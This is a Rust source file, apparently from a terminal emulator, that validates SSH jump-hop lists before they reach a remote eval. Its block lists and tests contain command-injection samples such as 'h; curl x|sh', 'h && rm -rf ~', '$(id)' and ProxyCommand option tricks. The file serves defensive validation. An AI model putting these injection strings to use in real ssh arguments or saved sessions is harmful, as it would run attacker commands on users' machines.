//! Reconnection through nested ssh hops (milestone 14c): the info a conductor keeps to
//! connect again, the jump script, and the rules for Duplicate Session and splits.
//!
//! Everything here can carry text the remote chose (the ssh arguments a hop reported, the
//! directory its shell reported), so nothing builds a local command line from it without
//! `identity_is_safe`, and every hop a new session reconnects through passes `safe_hops`
//! (a saved list is read back with `jumps_from`, which uses it).

use crate::ssh_args::Identity;
use serde::{Deserialize, Serialize};

/// it2ssh (`IS`), byte for byte: the jump script wraps it.
pub const IT2SSH: &str = include_str!("../resources/ssh/it2ssh");

/// The session-arrangement key holding a pane's jump list (`SESSION_ARRANGEMENT_PENDING_JUMPS`).
pub const PENDING_JUMPS_KEY: &str = "Pending Jumps";

/// The most hops a saved list may name: the hook tree's depth limit plus the first hop.
const MAX_JUMPS: usize = 16;

/// What it takes to connect to one hop again (`SSHReconnectionInfo`, `CD:737-741`).
#[derive(Clone, Debug, PartialEq, Serialize, Deserialize)]
pub struct Reconnection {
    pub sshargs: String,
    pub initial_directory: Option<String>,
    pub boolargs: String,
}

/// The script a conductor evals to jump to the next hop (`CD:1754-1770`): it2ssh wrapped in
/// a function and run with the hop's arguments, after the script removes its own file.
/// Beyond iTerm2 (which puts the text in as it is): the arguments are read back as words
/// (`hop_words`) and each goes in quoted as `%q` quotes it, so no text a hop reported is ever
/// shell syntax in the remote `eval` (ruling, final review I1). Text not in that form gives
/// no arguments; `Conductor::start_jumping` takes only hops `safe_hops` passed.
pub fn jump_script(it2ssh: &str, sshargs: &str) -> String {
    let args = crate::util_it2ssh::requote(&hop_words(sshargs).unwrap_or_default());
    format!("#!/usr/bin/env bash\nrm $SELF\nunset SELF\nit2ssh_wrapper() {{\n{it2ssh}\n}}\nit2ssh_wrapper {args}")
}

/// How the new conductor of a hooked session starts.
#[derive(Clone, Debug, PartialEq)]
pub enum Start {
    /// `startJumping(to:)` with the jumps left in the pane's list.
    Jump(Vec<Reconnection>),
    /// The previous conductor had jumps left: the new one takes them and the previous one is
    /// told (`childDidBeginJumping`).
    ParentJumps(Vec<Reconnection>),
    Plain,
}

/// The hook's directory and start (`PS:20129-20169`).
#[derive(Clone, Debug, PartialEq)]
pub struct HookPlan {
    pub directory: Option<String>,
    pub start: Start,
}

/// What a hook does with the pane's pending jumps: the profile's `PWD` counts only while no
/// conductor exists yet, and a pending jump's directory replaces it (even when it has none).
/// The first pending jump is used up; what is left starts the jumping when there is no
/// previous conductor, else the previous conductor's own subsequent jumps do.
pub fn hook_plan(pending: &mut Vec<Reconnection>, profile_pwd: Option<String>, has_previous: bool, previous_subsequent: &[Reconnection]) -> HookPlan {
    let mut directory = if has_previous { None } else { profile_pwd };
    if !pending.is_empty() {
        directory = pending.remove(0).initial_directory;
    }
    let start = if !has_previous && !pending.is_empty() {
        Start::Jump(pending.clone())
    } else if has_previous && !previous_subsequent.is_empty() {
        Start::ParentJumps(previous_subsequent.to_vec())
    } else {
        Start::Plain
    };
    HookPlan { directory, start }
}

/// Duplicate Session (`PT:2776-2808`): the command that makes the new pane an SSH session
/// when its profile is not one (the first hop's arguments), and the jumps in every case.
#[derive(Clone, Debug, PartialEq)]
pub struct DupPlan {
    pub command: Option<String>,
    pub jumps: Vec<Reconnection>,
}

pub fn duplicate_plan(profile_is_ssh: bool, sequence: &[Reconnection]) -> DupPlan {
    let command = if profile_is_ssh { None } else { sequence.first().map(|first| first.sshargs.clone()) };
    DupPlan { command, jumps: sequence.to_vec() }
}

/// The profile a split from an ssh session starts with (`PS:2948-2953`): the base with an
/// SSH command type, the identity's command line and an empty SSH configuration.
pub fn split_profile(base: &toml::Table, command_line: &str) -> toml::Table {
    let mut out = base.clone();
    out.insert("Custom Command".into(), "SSH".into());
    out.insert("Command".into(), command_line.into());
    out.insert("SSH".into(), toml::Value::Table(toml::Table::new()));
    out
}

/// A directory a remote shell reported, when it is one line of text (a newline would add
/// lines to the framer's `login` command).
pub fn clean_directory(dir: &str) -> Option<String> {
    (!dir.is_empty() && !dir.chars().any(char::is_control)).then(|| dir.to_string())
}

/// A folder an arrangement saved for a session, when it can name a remote folder: a POSIX
/// path (or `~`) of one line. A Windows folder cannot.
pub fn saved_remote_directory(saved: &str) -> Option<String> {
    Some(saved).filter(|d| d.starts_with(['/', '~'])).and_then(clean_directory)
}

/// Whether a host or user name may go into a command line Tandem runs locally: made of the
/// characters real names use, and not starting with `-` (ssh would read it as an option, such
/// as `-oProxyCommand=...`).
pub fn identity_is_safe(id: &Identity) -> bool {
    let word = |w: &str| !w.is_empty() && !w.starts_with('-') && w.chars().all(|c| c.is_ascii_alphanumeric() || "._-:@%[]+~".contains(c));
    word(&id.hostname) && id.username.as_deref().is_none_or(word)
}

/// A jump list as a value for a saved session (`iTermSSHReconnectionInfo.serialized`).
pub fn jumps_value(jumps: &[Reconnection]) -> toml::Value {
    let one = |j: &Reconnection| {
        let mut t = toml::Table::new();
        t.insert("sshargs".into(), j.sshargs.clone().into());
        if let Some(dir) = &j.initial_directory {
            t.insert("initialDirectory".into(), dir.clone().into());
        }
        t.insert("boolargs".into(), j.boolargs.clone().into());
        toml::Value::Table(t)
    };
    toml::Value::Array(jumps.iter().map(one).collect())
}

/// A jump list read back. A file can be edited and a session's text came from a remote host,
/// so a list with an entry of the wrong shape, or one `safe_hops` refuses (they reach a remote
/// `eval`), is dropped whole: the session then starts as an ordinary one.
pub fn jumps_from(v: &toml::Value) -> Vec<Reconnection> {
    let Some(items) = v.as_array().filter(|a| a.len() <= MAX_JUMPS) else { return Vec::new() };
    let mut out = Vec::new();
    for item in items {
        let Some(t) = item.as_table() else { return Vec::new() };
        let text = |k: &str| t.get(k).and_then(toml::Value::as_str).map(str::to_string);
        let (Some(sshargs), Some(boolargs)) = (text("sshargs"), text("boolargs")) else { return Vec::new() };
        out.push(Reconnection { sshargs, initial_directory: text("initialDirectory"), boolargs });
    }
    safe_hops(&out).unwrap_or_default()
}

/// ssh's options that take a value (OpenSSH `ssh.c`'s getopt string). Fixed here, not read
/// from a hop's `boolargs`: those come from the same remote as its arguments, and a letter
/// they called a value-taking one would hide the next option from the screen.
const VALUE_LETTERS: &str = "BbcDEeFIiJLlmOoPpQRSWw";

/// Options a hop may not carry: `-F` loads another configuration (which can run commands),
/// `-I` loads a PKCS#11 library and `-E` appends to any file (ruling, final review I1).
const REFUSED_LETTERS: &str = "EFI";

/// `-o` keywords a hop may not carry, lower case: each runs a command, loads code or reads
/// another configuration on the host that runs the jump (ruling, final review I1).
const REFUSED_KEYWORDS: &[&str] = &["proxycommand", "localcommand", "permitlocalcommand", "remotecommand", "knownhostscommand", "match", "include", "pkcs11provider", "securitykeyprovider", "xauthlocation"];

/// Characters no word of a hop may hold once unquoted: ssh expands words such as the host
/// into commands a configuration names (`%h` in a ProxyCommand), and older ssh versions do not
/// screen them there.
const SHELL_METACHARACTERS: &str = ";|&$`<>(){}'\"\\";

/// The hops a new session may reconnect through (Duplicate Session, Duplicate Tab, an
/// arrangement), or None for a plain session: the one validator for all of them (ruling,
/// final review I1). Every hop must be one line of text, its ssh arguments words as it2ssh
/// quotes them (`hop_words`), and none of them an option that runs a command, loads code or
/// reads another configuration (`words_are_safe`), however ssh would spell it. One refused
/// hop refuses the list, as does an empty list or one longer than `MAX_JUMPS`.
pub fn safe_hops(hops: &[Reconnection]) -> Option<Vec<Reconnection>> {
    (!hops.is_empty() && hops.len() <= MAX_JUMPS && hops.iter().all(hop_is_safe)).then(|| hops.to_vec())
}

fn hop_is_safe(hop: &Reconnection) -> bool {
    let bad = |s: &str| s.chars().any(char::is_control);
    if bad(&hop.boolargs) || hop.initial_directory.as_deref().is_some_and(bad) {
        return false;
    }
    hop_words(&hop.sshargs).is_some_and(|words| !words.is_empty() && words_are_safe(&words))
}

/// Whether no word is a refused option. Every word that starts with `-` is read as ssh's
/// getopt reads one (letters that take no value, then one that takes the rest of the word or
/// the next word), even where ssh would read it as a value: refusing too much only makes a
/// plain session. `-o`'s value is a configuration line: its keyword, after any spaces or
/// quotes, ends at a space or `=` (`-oX=v`, `-o X=v`, `-o "X v"`), in any case.
fn words_are_safe(words: &[String]) -> bool {
    let refused_option = |line: &str| {
        let key: String = line.trim_start_matches(|c: char| c.is_whitespace() || c == '"').chars().take_while(char::is_ascii_alphanumeric).collect();
        REFUSED_KEYWORDS.contains(&key.to_ascii_lowercase().as_str())
    };
    for (i, w) in words.iter().enumerate() {
        if w.chars().any(|c| SHELL_METACHARACTERS.contains(c)) {
            return false;
        }
        let Some(letters) = w.strip_prefix('-').filter(|l| *l != "-") else { continue };
        for (at, l) in letters.char_indices() {
            if REFUSED_LETTERS.contains(l) {
                return false;
            }
            if VALUE_LETTERS.contains(l) {
                let rest = &letters[at + l.len_utf8()..];
                let value = if rest.is_empty() { words.get(i + 1).map_or("", String::as_str) } else { rest };
                if l == 'o' && refused_option(value) {
                    return false;
                }
                break;
            }
        }
    }
    true
}

/// A restored session's pending jumps (`PS:2214`): only a session that runs ssh takes them,
/// since only such a session's are saved (`PS:7342-7347`). On any other pane they would wait
/// for an it2ssh typed by hand and then run the file's hops on that host.
pub fn restored_jumps(saved: Option<&toml::Value>, profile_ssh: bool) -> Vec<Reconnection> {
    saved.filter(|_| profile_ssh).map(jumps_from).unwrap_or_default()
}

/// A hop's ssh arguments as the words they stand for, when they are words as it2ssh writes
/// them (`printf "%q "`, `IS:66-69`), the form iTerm2's jump script assumes when it puts them
/// unquoted after `it2ssh_wrapper` in a remote `eval` (`CD:1754-1770`): words split by one
/// space, each `''` or characters that `%q` leaves bare, any character escaped with a
/// backslash. None for anything else: a shell metacharacter outside that (`;`, `|`, `$(`, a
/// backquote, a quote, a redirection), or a `$'...'` word, which holds control characters.
pub fn hop_words(sshargs: &str) -> Option<Vec<String>> {
    let mut words = Vec::new();
    let mut word = String::new();
    let mut chars = sshargs.chars().peekable();
    // The previous character of the current word; None at a word's start.
    let mut prev: Option<char> = None;
    while let Some(c) = chars.next() {
        match c {
            // Words split by exactly one space: an empty word is `''`.
            ' ' if prev.is_none() => return None,
            ' ' => {
                words.push(std::mem::take(&mut word));
                prev = None;
            }
            '\\' => match chars.next() {
                Some(e) if !e.is_control() => {
                    word.push(e);
                    prev = Some(e);
                }
                _ => return None,
            },
            '\'' if prev.is_none() && chars.peek() == Some(&'\'') => {
                chars.next();
                if chars.peek().is_some_and(|&n| n != ' ') {
                    return None;
                }
                prev = Some('\'');
            }
            c if crate::util_it2ssh::needs_quote(c, prev) || c.is_control() => return None,
            c => {
                word.push(c);
                prev = Some(c);
            }
        }
    }
    if prev.is_some() {
        words.push(word);
    }
    Some(words)
}

#[cfg(test)]
mod tests {
    use super::*;

    fn r(args: &str, dir: Option<&str>) -> Reconnection {
        Reconnection { sshargs: args.into(), initial_directory: dir.map(String::from), boolargs: String::new() }
    }

    #[test]
    fn jump_script_follows_iterm2() {
        assert_eq!(jump_script("BODY\n", "-p 22 h"), "#!/usr/bin/env bash\nrm $SELF\nunset SELF\nit2ssh_wrapper() {\nBODY\n\n}\nit2ssh_wrapper -p 22 h ");
        assert!(IT2SSH.starts_with("#!"));
        assert_eq!(IT2SSH.lines().count(), 193);
        assert_eq!(IT2SSH.matches('\n').count(), 193, "the file ends with a newline, as wc -l counts");
    }

    #[test]
    fn hook_plan_follows_iterm2() {
        let (a, b, c) = (r("a", Some("/da")), r("b", Some("/db")), r("c", None));
        // Two pending: the first names the directory, the rest jump.
        let mut pending = vec![a.clone(), b.clone()];
        let plan = hook_plan(&mut pending, Some("/p".into()), false, &[]);
        assert_eq!((plan.directory.as_deref(), plan.start), (Some("/da"), Start::Jump(vec![b.clone()])));
        assert_eq!(pending, [b.clone()]);
        // One pending: nothing left to jump to.
        let mut pending = vec![a.clone()];
        let plan = hook_plan(&mut pending, Some("/p".into()), false, &[]);
        assert_eq!((plan.directory.as_deref(), plan.start), (Some("/da"), Start::Plain));
        assert!(pending.is_empty());
        // A pending jump without a directory still overrides the profile's.
        let mut pending = vec![c.clone()];
        assert_eq!(hook_plan(&mut pending, Some("/p".into()), false, &[]).directory, None);
        // None pending: the profile's PWD, only with no previous conductor.
        let plan = hook_plan(&mut Vec::new(), Some("/p".into()), false, &[]);
        assert_eq!((plan.directory.as_deref(), plan.start), (Some("/p"), Start::Plain));
        assert_eq!(hook_plan(&mut Vec::new(), Some("/p".into()), true, &[]).directory, None);
        // A previous conductor with jumps left hands them on.
        let plan = hook_plan(&mut Vec::new(), None, true, &[c.clone()]);
        assert_eq!(plan.start, Start::ParentJumps(vec![c.clone()]));
        // ... and pending [a, b] with a previous conductor and no jumps of its own: a's
        // directory, a plain start.
        let mut pending = vec![a.clone(), b.clone()];
        let plan = hook_plan(&mut pending, None, true, &[]);
        assert_eq!((plan.directory.as_deref(), plan.start), (Some("/da"), Start::Plain));
        // Without a previous conductor the parent's jumps mean nothing.
        let plan = hook_plan(&mut Vec::new(), None, false, &[c]);
        assert_eq!(plan.start, Start::Plain);
    }

    #[test]
    fn duplicate_follows_iterm2() {
        let (s0, s1) = (r("h1", Some("/a")), r("h2", Some("/b")));
        let plan = duplicate_plan(true, &[s0.clone(), s1.clone()]);
        assert_eq!((plan.command, plan.jumps), (None, vec![s0.clone(), s1.clone()]));
        let plan = duplicate_plan(false, &[s0.clone(), s1.clone()]);
        assert_eq!((plan.command.as_deref(), plan.jumps), (Some("h1"), vec![s0.clone(), s1.clone()]));
        assert_eq!(duplicate_plan(false, &[]).command, None);

        let mut base = toml::Table::new();
        base.insert("Name".into(), "n".into());
        base.insert("Custom Command".into(), "Yes".into());
        base.insert("Command".into(), "pwsh".into());
        let split = split_profile(&base, "-l u -p 2222 h.lan");
        assert_eq!(split.get("Custom Command").and_then(|v| v.as_str()), Some("SSH"));
        assert_eq!(split.get("Command").and_then(|v| v.as_str()), Some("-l u -p 2222 h.lan"));
        assert_eq!(split.get("SSH").and_then(|v| v.as_table()).map(toml::Table::len), Some(0));
        assert_eq!(split.get("Name").and_then(|v| v.as_str()), Some("n"));
        assert_eq!(base.get("Command").and_then(|v| v.as_str()), Some("pwsh"), "the base is not changed");

        assert_eq!(jumps_from(&jumps_value(&[s0.clone(), s1.clone()])), [s0, s1]);
    }

    #[test]
    fn identity_command_line_follows_iterm2() {
        let id = |user: Option<&str>, port: u16| crate::ssh_args::Identity { host: "h".into(), hostname: "h.lan".into(), username: user.map(String::from), port };
        assert_eq!(id(Some("u"), 2222).command_line(), "-l u -p 2222 h.lan");
        assert_eq!(id(None, 22).command_line(), "h.lan");
        assert_eq!(id(Some("u"), 22).command_line(), "-l u h.lan");
        assert_eq!(id(None, 2200).command_line(), "-p 2200 h.lan");
    }

    #[test]
    fn remote_text_is_never_trusted_locally() {
        // A saved list with a control character anywhere is dropped whole.
        let mut v = jumps_value(&[r("a", Some("/x")), r("b", None)]);
        v.as_array_mut().unwrap()[1].as_table_mut().unwrap().insert("sshargs".into(), "b\nrm -rf x".into());
        assert!(jumps_from(&v).is_empty());
        let mut v = jumps_value(&[r("a", Some("/x"))]);
        v.as_array_mut().unwrap()[0].as_table_mut().unwrap().insert("initialDirectory".into(), "/x\ny".into());
        assert!(jumps_from(&v).is_empty());
        assert!(jumps_from(&toml::Value::String("x".into())).is_empty());
        // Too many hops is a broken list.
        let many: Vec<Reconnection> = (0..40).map(|i| r(&format!("h{i}"), None)).collect();
        assert!(jumps_from(&jumps_value(&many)).is_empty());
        // A directory the remote reported is kept only when it is one line of text.
        assert_eq!(clean_directory("/home/u"), Some("/home/u".to_string()));
        assert_eq!(clean_directory("/a\nb"), None);
        assert_eq!(clean_directory(""), None);
        assert_eq!(saved_remote_directory("/srv/x"), Some("/srv/x".to_string()));
        assert_eq!(saved_remote_directory("~/x"), Some("~/x".to_string()));
        assert_eq!(saved_remote_directory("C:\\Users\\x"), None);
        assert_eq!(saved_remote_directory("/a\rb"), None);
        // Names that could be read as ssh options or as several words never reach a local command line.
        let id = |host: &str, user: Option<&str>| crate::ssh_args::Identity { host: host.into(), hostname: host.into(), username: user.map(String::from), port: 22 };
        assert!(identity_is_safe(&id("h.lan", Some("u"))));
        assert!(!identity_is_safe(&id("-oProxyCommand=calc", None)));
        assert!(!identity_is_safe(&id("h", Some("-oX=y"))));
        assert!(!identity_is_safe(&id("h h", None)));
        assert!(!identity_is_safe(&id("h\n", None)));
        assert!(!identity_is_safe(&id("", None)));
    }

    /// An arrangement file's hops reach a remote `eval` as `it2ssh_wrapper <sshargs>`
    /// (`CD:1754-1770`), which iTerm2 gets away with because it2ssh wrote them with
    /// `printf "%q "` (`IS:66-69`). A hop that is not in that form (a `;`, a `|`, a `$(...)`,
    /// a backquote, a redirection outside quoting) drops the list.
    #[test]
    fn saved_hops_must_be_quoted_as_it2ssh_quotes() {
        let list = |args: &str| jumps_value(&[r("-p 22 h ", None), r(args, Some("/x"))]);
        for good in ["-p 2222 user@host ", "h", "-o ProxyJump=a\\,b h", "a\\ b\\*c\\?d h ", "-l '' h ", "\\~u h", "-o ServerAliveInterval=30 h"] {
            assert_eq!(jumps_from(&list(&good)).len(), 2, "{good}");
        }
        assert_eq!(jumps_from(&list(&crate::util_it2ssh::requote(&["a b".into(), "x,y".into(), "[z]".into(), "".into()]))).len(), 2, "what it2ssh writes for words without metacharacters");
        // Escaped metacharacters are in it2ssh's form, but final review I1's screen refuses
        // them in any word (`words_are_safe`).
        for bad in ["a\\ b\\;c\\|d h ", "\\$HOME h", "it\\'s h", "\\{x\\} h"] {
            assert!(jumps_from(&list(&bad)).is_empty(), "{bad}");
        }
        for bad in ["h; curl x|sh", "h && rm -rf ~", "$(id) h", "`id` h", "h > /tmp/x", "h | sh", "'a b' h", "\"a\" h", "h &", "h\\", "*", "h #x", "~/x h", "a  b", " h"] {
            assert!(jumps_from(&list(&bad)).is_empty(), "{bad}");
        }
    }

    /// Final review I1 (ruling): one validator for every hop a new session reconnects through
    /// (Duplicate Session, Duplicate Tab, an arrangement). Its text reaches a remote `eval`, so
    /// an option that runs a command or loads code or another configuration refuses the hop,
    /// in every spelling ssh takes; so does a shell metacharacter in any word.
    #[test]
    fn a_hop_that_runs_a_command_is_refused() {
        let one = |args: &str| safe_hops(&[r(args, None)]);
        for good in ["-p 2222 user@host ", "h", "-o ProxyJump=a\\,b h ", "-J bastion h ", "-L 8080:localhost:80 h ", "-o ServerAliveInterval=30 h ", "-4 -t h ", "-l '' h ", "-o SetEnv\\ A=b h "] {
            assert!(one(good).is_some(), "{good}");
        }
        for bad in [
            "-oProxyCommand=sh\\ -c\\ id h ",
            "-o ProxyCommand=id h ",
            "-o ProxyCommand\\ id h ",
            "-oproxycommand=id h ",
            "-o PROXYCOMMAND=id h ",
            "-oLocalCommand=id -oPermitLocalCommand=yes h ",
            "-o PermitLocalCommand=yes h ",
            "-oRemoteCommand=id h ",
            "-o KnownHostsCommand=id h ",
            "-o Match\\ exec\\ id h ",
            "-oMatch=all h ",
            "-F cfg h ",
            "-Fcfg h ",
            "-4F cfg h ",
            "-4oProxyCommand=id h ",
            "-o \\ ProxyCommand=id h ",
            "-o \\\"ProxyCommand\\\"\\ id h ",
            "-I lib.so h ",
            "-o PKCS11Provider=x.so h ",
            "-o XAuthLocation=/tmp/x h ",
            "-E log h ",
            r"h\;id ",
            "a\\$\\(id\\) h ",
            "",
        ] {
            assert!(one(bad).is_none(), "{bad}");
        }
        // One refused hop refuses the list; so does a control character in any field.
        assert!(safe_hops(&[r("h1 ", None), r("-oProxyCommand=id h2 ", None)]).is_none());
        assert!(safe_hops(&[r("h1 ", Some("/a\nb"))]).is_none());
        assert!(safe_hops(&[]).is_none());
        // The arrangement path takes the same validator.
        assert!(jumps_from(&jumps_value(&[r("h1 ", None), r("-oProxyCommand=id h2 ", None)])).is_empty());
        assert!(jumps_from(&jumps_value(&[r("-F /tmp/c h ", None)])).is_empty());
    }

    /// Every argument goes into the remote `eval` quoted as `%q` quotes it, whatever the hop's
    /// text says.
    #[test]
    fn the_jump_script_quotes_every_argument() {
        let s = jump_script("B", "h; curl x|sh");
        assert!(!s.contains("; curl"), "{s}");
        assert!(jump_script("B", "-p 22 a\\ b ").ends_with("\nit2ssh_wrapper -p 22 a\\ b "));
        assert!(jump_script("B", "-p 22 h").ends_with("\nit2ssh_wrapper -p 22 h "));
    }

    /// Pending Jumps are written only for an SSH-type profile (`PS:7342-7347`), so only such a
    /// restored session takes them: on any other pane they would wait for an it2ssh typed by
    /// hand and then run the file's hops on that host.
    #[test]
    fn only_an_ssh_session_takes_restored_jumps() {
        let v = jumps_value(&[r("a", Some("/x")), r("b", None)]);
        assert_eq!(restored_jumps(Some(&v), true).len(), 2);
        assert!(restored_jumps(Some(&v), false).is_empty(), "a session that does not run ssh");
        assert!(restored_jumps(None, true).is_empty());
    }
}
